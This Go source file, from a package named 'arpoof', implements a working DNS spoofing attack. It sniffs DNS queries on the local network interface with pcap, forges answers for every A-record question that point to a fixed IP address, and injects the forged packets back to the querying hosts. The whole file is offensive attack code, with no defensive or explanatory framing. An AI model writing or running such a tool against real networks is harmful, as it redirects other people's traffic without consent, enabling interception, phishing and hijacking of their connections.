package arpoof

import (
	"fmt"
	"log"
	"net"

	hdisc "github.com/KennyZ69/HdiscLib"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

func DNSpoof() {
	ifi, err := hdisc.LocalIface()
	if err != nil {
		log.Fatalf("Error getting local net interface: %s\n", err)
	}

	handle, err := pcap.OpenLive(ifi.Name, 65536, true, pcap.BlockForever)
	if err != nil {
		log.Fatalf("Error opening pcap.Handle: %s\n", err)
	}
	defer handle.Close()

	localIP, _, err := hdisc.GetLocalNet()
	if err != nil {
		log.Fatalf("Error getting local ip: %s\n", err)
	}

	if err = handle.SetBPFFilter("udp and dst port 53"); err != nil {
		fmt.Printf("Error setting bpf filter: %s\n", err)
	}

	var (
		ethLayer  layers.Ethernet
		ipv4Layer layers.IPv4
		udpLayer  layers.UDP
		dnsLayer  layers.DNS

		q layers.DNSQuestion
		a layers.DNSResourceRecord
	)

	decoder := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &ethLayer, &ipv4Layer, &udpLayer, &dnsLayer)

	decoded := make([]gopacket.LayerType, 4)

	log.Println("DNS spoofing starting...")

	a.Type = layers.DNSTypeA
	a.Class = layers.DNSClassIN
	a.TTL = 300
	// a.IP = localIP
	a.IP = net.ParseIP("142.250.72.206")

	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	// variables for swaping out the values later in the loop
	var (
		udpPort  layers.UDPPort
		ipv4Addr net.IP
		hAddr    net.HardwareAddr
	)

	// loop iterator
	var i uint16

	// loop for intercepting just dns packets and sending forged responses
	for {
		data, _, err := handle.ZeroCopyReadPacketData()
		if err != nil {
			break
		}

		if err = decoder.DecodeLayers(data, &decoded); err != nil {
			fmt.Printf("Error while decoding: %s\n", err)
			continue
		}

		log.Println("Got a dns packet from filter")

		// skip if it is a packet from my own machine
		if ipv4Layer.SrcIP.Equal(localIP) {
			continue
		}

		if len(decoded) != 4 {
			fmt.Println("Not enough layers decoded yet")
			continue
		}

		// check for a resposne
		if dnsLayer.QR {
			continue
		}

		for i = 0; i < dnsLayer.QDCount; i++ {
			fmt.Println(string(dnsLayer.Questions[i].Name))
		}

		dnsLayer.Answers = nil // clear out previous answers
		dnsLayer.QR = true

		if dnsLayer.RD {
			dnsLayer.RA = true
		}

		for i = 0; i < dnsLayer.QDCount; i++ {

			q = dnsLayer.Questions[i]

			if q.Type != layers.DNSTypeA || q.Class != layers.DNSClassIN {
				continue
			}

			a.Name = q.Name

			dnsLayer.Answers = append(dnsLayer.Answers, a)
			dnsLayer.ANCount = 1

		}
		// now swap variables for it to send the forged dns response
		hAddr = ethLayer.SrcMAC
		ethLayer.SrcMAC = ethLayer.DstMAC
		ethLayer.DstMAC = hAddr

		ipv4Addr = ipv4Layer.SrcIP
		ipv4Layer.SrcIP = ipv4Layer.DstIP
		ipv4Layer.DstIP = ipv4Addr

		udpPort = udpLayer.SrcPort
		udpLayer.SrcPort = udpLayer.DstPort
		udpLayer.DstPort = udpPort

		if err = udpLayer.SetNetworkLayerForChecksum(&ipv4Layer); err != nil {
			log.Fatalf("Error setting net layer for checksum on udpLayer: %s\n", err)
		}

		if err = gopacket.SerializeLayers(buf, opts, &ethLayer, &ipv4Layer, &udpLayer, &dnsLayer); err != nil {
			log.Fatalf("Error serializing layers: %s\n", err)
		}

		if err = handle.WritePacketData(buf.Bytes()); err != nil {
			log.Fatalf("Error writing packet data: %s\n", err)
		}

		log.Println("Sent the DNS response")

		continue // or can be commented to move on to debugging part
	}
}
